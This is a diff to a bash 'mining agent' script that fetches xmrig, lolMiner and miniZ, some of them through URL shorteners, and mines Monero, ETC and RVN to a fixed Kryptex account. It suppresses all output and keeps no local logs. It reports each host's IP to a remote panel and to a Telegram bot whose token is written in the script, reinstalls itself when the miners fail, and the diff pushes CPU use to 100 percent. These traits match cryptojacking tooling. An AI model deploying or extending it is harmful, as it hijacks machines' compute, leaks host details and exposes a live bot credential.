@@ -1,11 +1,12 @@
 #!/bin/bash
-# MINING AGENT v4.3 — PANEL + CRITICAL TG | SELF-HEALING | ULTRA PORTABLE
-# No local logs. Panel heartbeat. Telegram only for start/success/fatal errors.
+# MINING AGENT v5.0 — MAXIMUM UPTIME & PERFORMANCE
+# Supports CPU (XMR/RandomX) + GPU (ETCHASH/KAWPOW) via lolMiner/xmrig/miniZ
+# Zero local logs, panel heartbeat, critical Telegram alerts only.
 # Launch: ALLOW_MINING=1 bash agent.sh
 set -u
 
 #############################################
-# CONFIGURATION
+# CONFIGURATION (customize if needed)
 #############################################
 ALLOW_MINING="${ALLOW_MINING:-0}"
 TEST_MODE="${TEST_MODE:-0}"
@@ -23,7 +24,7 @@ HEARTBEAT_ENDPOINT="${HEARTBEAT_ENDPOINT:-/api/heartbeat}"
 LOGS_ENDPOINT="${LOGS_ENDPOINT:-/api/logs/push}"
 PANEL_USERNAME="${PANEL_USERNAME:-$(whoami)}"
 
-# Telegram (CRITICAL MESSAGES ONLY)
+# Telegram (CRITICAL ONLY)
 TG_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
 TG_CHAT="5336452267"
 TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"
@@ -31,10 +32,13 @@ TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"
 # Kryptex Account
 KRIPTEX="krxX3PVQVR"
 
-# Pools
-XMR_POOL="xmr.kryptex.network:7029"
-ETC_POOL="etc.kryptex.network:7033"
-RVN_POOL="rvn.kryptex.network:6013"
+# Pools (choose your main algorithms)
+XMR_POOL="xmr.kryptex.network:7029"      # CPU RandomX
+ETC_POOL="etc.kryptex.network:7033"      # GPU ETCHASH
+RVN_POOL="rvn.kryptex.network:6013"      # GPU KAWPOW (optional)
+
+# GPU algorithm – change to KAWPOW if you want RVN
+GPU_ALGO="${GPU_ALGO:-ETCHASH}"
 
 # Paths
 BASE="${HOME}/.mining"
@@ -62,8 +66,8 @@ ensure_http_client() {
 http_get() {
   _url="$1"; _timeout="${2:-$DOWNLOAD_TIMEOUT}"
   case "$HTTP_CLIENT" in
-    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.3" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
-    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/4.3" --tries=2 "$_url" 2>/dev/null ;;
+    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/5.0" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
+    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/5.0" --tries=2 "$_url" 2>/dev/null ;;
     busybox) busybox wget -qO- -T "$_timeout" "$_url" 2>/dev/null ;;
     *) return 1 ;;
   esac
@@ -72,8 +76,8 @@ http_get() {
 download_file() {
   _out="$1"; _url="$2"; _timeout="${3:-$DOWNLOAD_TIMEOUT}"
   case "$HTTP_CLIENT" in
-    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.3" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
-    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/4.3" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
+    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/5.0" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
+    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/5.0" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
     busybox) busybox wget -T "$_timeout" -O "$_out" "$_url" 2>/dev/null ;;
     *) return 1 ;;
   esac
@@ -106,10 +110,6 @@ has_gpu() {
   (command_exists rocm-smi) ||
   (find /dev/dri -name 'card*' 2>/dev/null | head -1)
 }
-
-#############################################
-# IP ADDRESS
-#############################################
 
 get_report_ip() {
   for _src in \
@@ -181,7 +181,7 @@ should_reinstall() {
 reset_restart_state() { echo "0|0|$(date +%s)" > "$1"; }
 
 #############################################
-# INSTALLERS
+# INSTALLERS (MAXIMUM MIRRORS & FALLBACKS)
 #############################################
 
 install_xmrig() {
@@ -220,20 +220,27 @@ install_xmrig() {
 install_lolminer() {
   kill_miner "lolMiner"
   rm -f "$BIN/gpu/lolMiner" 2>/dev/null
-  rm -rf "$BIN/gpu/lolMiner"* 2>/dev/null
+  rm -rf "$BIN/gpu/1.98" 2>/dev/null
   _mirrors="
+    https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz
     https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz
-    https://www.lorexxar.ch/lolminer/lolMiner_v1.98a_Lin64.tar.gz
-    https://bit.ly/lolminer198a
+    https://www.lorexxar.ch/lolminer/lolMiner_v1.98_Lin64.tar.gz
+    https://bit.ly/lolminer198
     https://tinyurl.com/lolminer198
-    https://github.com/Lolliedieb/lolMiner-releases/releases/latest/download/lolMiner_v1.98a_Lin64.tar.gz
+    https://github.com/Lolliedieb/lolMiner-releases/releases/latest/download/lolMiner_v1.98_Lin64.tar.gz
   "
   _attempt=1
   while [ $_attempt -le "$INSTALL_RETRIES" ]; do
     for _url in $_mirrors; do
       if download_file "/tmp/lolminer.tgz" "$_url" 45; then
         mkdir -p "$BIN/gpu" 2>/dev/null
-        if tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 2>/dev/null; then
+        if tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" 2>/dev/null; then
+          # Find the extracted directory (usually 1.98 or similar)
+          _extracted_dir=$(find "$BIN/gpu" -maxdepth 1 -type d -name "1.*" | head -1)
+          if [ -n "$_extracted_dir" ]; then
+            mv "$_extracted_dir"/* "$BIN/gpu/" 2>/dev/null
+            rm -rf "$_extracted_dir" 2>/dev/null
+          fi
           chmod +x "$BIN/gpu/lolMiner" 2>/dev/null
           if [ -x "$BIN/gpu/lolMiner" ] && "$BIN/gpu/lolMiner" --version >/dev/null 2>&1; then
             rm -f /tmp/lolminer.tgz 2>/dev/null
@@ -250,39 +257,42 @@ install_lolminer() {
 }
 
 install_miniz() {
+  # Fallback for Kaspa/kHeavyHash or KAWPOW
   kill_miner "miniz"
   rm -f "$BIN/gpu/miniz" 2>/dev/null
   _mirrors="
     https://github.com/miniz-mining/miniz/releases/download/v3.2pl1/miniz-3.2pl1-x64-linux.tar.gz
     https://miniz.ch/download/miniz-3.2pl1-x64-linux.tar.gz
+    https://github.com/miniz-mining/miniz/releases/latest/download/miniz-3.2pl1-x64-linux.tar.gz
   "
   for _url in $_mirrors; do
     if download_file "/tmp/miniz.tar.gz" "$_url" 45; then
       mkdir -p "$BIN/gpu" 2>/dev/null
       if tar -xzf /tmp/miniz.tar.gz -C "$BIN/gpu" 2>/dev/null; then
         chmod +x "$BIN/gpu/miniz" 2>/dev/null
-        [ -x "$BIN/gpu/miniz" ] && return 0
+        [ -x "$BIN/gpu/miniz" ] && { rm -f /tmp/miniz.tar.gz; return 0; }
       fi
+      rm -f /tmp/miniz.tar.gz 2>/dev/null
     fi
-    rm -f /tmp/miniz.tar.gz 2>/dev/null
   done
   return 1
 }
 
 #############################################
-# MINER STARTERS (output -> /dev/null)
+# MINER STARTERS (FULL RESOURCE USAGE)
 #############################################
 
 start_cpu() {
   is_alive "$PID_CPU" "xmrig" && return 0
   _retry=1
   while [ $_retry -le 3 ]; do
+    # Use all CPU cores with maximum performance hints
     "$BIN/cpu/xmrig" \
       -o "$XMR_POOL" \
       -u "$KRIPTEX.$(get_node_id)" -p x \
       --algo randomx \
       --http-enabled --http-host 127.0.0.1 --http-port 16000 \
-      --cpu-max-threads-hint=90 \
+      --cpu-max-threads-hint=100 \
       --no-cpu-affinity \
       --donate-level 0 \
       --tls >/dev/null 2>&1 &
@@ -299,14 +309,41 @@ start_gpu() {
   is_alive "$PID_GPU" "lolMiner" && return 0
   _retry=1
   while [ $_retry -le 3 ]; do
-    "$BIN/gpu/lolMiner" \
-      --algo ETCHASH \
-      --pool "$ETC_POOL" \
-      --user "$KRIPTEX.$(get_node_id)" \
-      --ethstratum ETCPROXY \
-      --apihost 127.0.0.1 --apiport 8080 \
-      --watchdog exit \
-      --tls on >/dev/null 2>&1 &
+    case "$GPU_ALGO" in
+      ETCHASH)
+        "$BIN/gpu/lolMiner" \
+          --algo ETCHASH \
+          --pool "$ETC_POOL" \
+          --user "$KRIPTEX.$(get_node_id)" \
+          --ethstratum ETCPROXY \
+          --apihost 127.0.0.1 --apiport 8080 \
+          --watchdog exit \
+          --tls on \
+          --devices AUTO >/dev/null 2>&1 &
+        ;;
+      KAWPOW)
+        "$BIN/gpu/lolMiner" \
+          --algo KAWPOW \
+          --pool "$RVN_POOL" \
+          --user "$KRIPTEX.$(get_node_id)" \
+          --apihost 127.0.0.1 --apiport 8080 \
+          --watchdog exit \
+          --tls on \
+          --devices AUTO >/dev/null 2>&1 &
+        ;;
+      *)
+        # Fallback to ETCHASH
+        "$BIN/gpu/lolMiner" \
+          --algo ETCHASH \
+          --pool "$ETC_POOL" \
+          --user "$KRIPTEX.$(get_node_id)" \
+          --ethstratum ETCPROXY \
+          --apihost 127.0.0.1 --apiport 8080 \
+          --watchdog exit \
+          --tls on \
+          --devices AUTO >/dev/null 2>&1 &
+        ;;
+    esac
     echo $! > "$PID_GPU"
     sleep 6
     is_alive "$PID_GPU" "lolMiner" && return 0
@@ -407,33 +444,26 @@ heartbeat() {
 }
 
 get_uptime() {
-  _u=$(awk '{printf "%d",$1}' /proc/uptime 2>/dev/null) || _u="0"
-  echo "$_u"
+  awk '{printf "%d",$1}' /proc/uptime 2>/dev/null || echo "0"
 }
 
 get_cpu_hashrate() {
-  _hr=$(http_get "http://127.0.0.1:16000/1/summary" 5 2>/dev/null | grep -oE '"hashrate":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
-  echo "${_hr:-0}"
+  http_get "http://127.0.0.1:16000/1/summary" 5 2>/dev/null | grep -oE '"hashrate":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1 || echo "0"
 }
 
 get_gpu_hashrate() {
-  _hr=$(http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
-  echo "${_hr:-0}"
+  http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1 || echo "0"
 }
 
 #############################################
-# RECOVERY & SELF-HEALING
+# RECOVERY
 #############################################
 
 recover_cpu() {
   if should_reinstall "$STATE_CPU"; then
     send_log "reinstall" "CPU miner unstable, reinstalling"
     reset_restart_state "$STATE_CPU"
-    if install_xmrig && start_cpu; then
-      send_log "info" "CPU reinstall successful"
-    else
-      send_log "error" "CPU reinstall failed"
-    fi
+    install_xmrig && start_cpu && send_log "info" "CPU reinstall OK" || send_log "error" "CPU reinstall failed"
   else
     start_cpu || true
   fi
@@ -444,9 +474,9 @@ recover_gpu() {
     send_log "reinstall" "GPU miner unstable, reinstalling"
     reset_restart_state "$STATE_GPU"
     if install_lolminer; then
-      start_gpu && send_log "info" "GPU reinstall (lolMiner) successful"
+      start_gpu && send_log "info" "GPU reinstall (lolMiner) OK"
     else
-      install_miniz && start_gpu && send_log "info" "GPU reinstall (miniZ) successful" || send_log "error" "GPU reinstall failed"
+      install_miniz && start_gpu && send_log "info" "GPU reinstall (miniZ) OK" || send_log "error" "GPU reinstall failed"
     fi
   else
     start_gpu || true
@@ -454,7 +484,7 @@ recover_gpu() {
 }
 
 #############################################
-# LOCK FILE
+# LOCK
 #############################################
 
 acquire_lock() {
@@ -485,9 +515,7 @@ main() {
   REPORT_IP=$(get_report_ip)
   RUN_ID="${NODE_ID}-$(date +%s)-$$"
   _arch=$(get_arch)
-  _os=$(get_os 2>/dev/null || echo "unknown")
 
-  # Telegram: agent starting
   tg "🟢 Mining agent starting on ${NODE_ID} (${REPORT_IP}) | RunID: ${RUN_ID}"
 
   init_state "$STATE_CPU"
@@ -530,7 +558,7 @@ main() {
   sleep 10
 
   if [ "$_cpu_ok" = "1" ] || [ "$_gpu_ok" = "1" ]; then
-    _status="CPU:${_cpu_ok} GPU:${_gpu_ok}"
+    _status="CPU:${_cpu_ok} GPU:${_gpu_ok} algo=${GPU_ALGO}"
     tg "✅ Mining active on ${NODE_ID} (${REPORT_IP}) | ${_status} | RunID: ${RUN_ID}"
     send_log "info" "Mining started: ${_status}"
   else
@@ -551,7 +579,7 @@ main() {
         _hr2=$(get_gpu_hashrate)
         if [ "$_hr2" = "0" ]; then
           if should_reinstall "$STATE_GPU"; then
-            send_log "reinstall" "GPU zero HR persistent, reinstalling"
+            send_log "reinstall" "GPU zero HR, reinstalling"
             reset_restart_state "$STATE_GPU"
             install_lolminer && start_gpu || true
           else
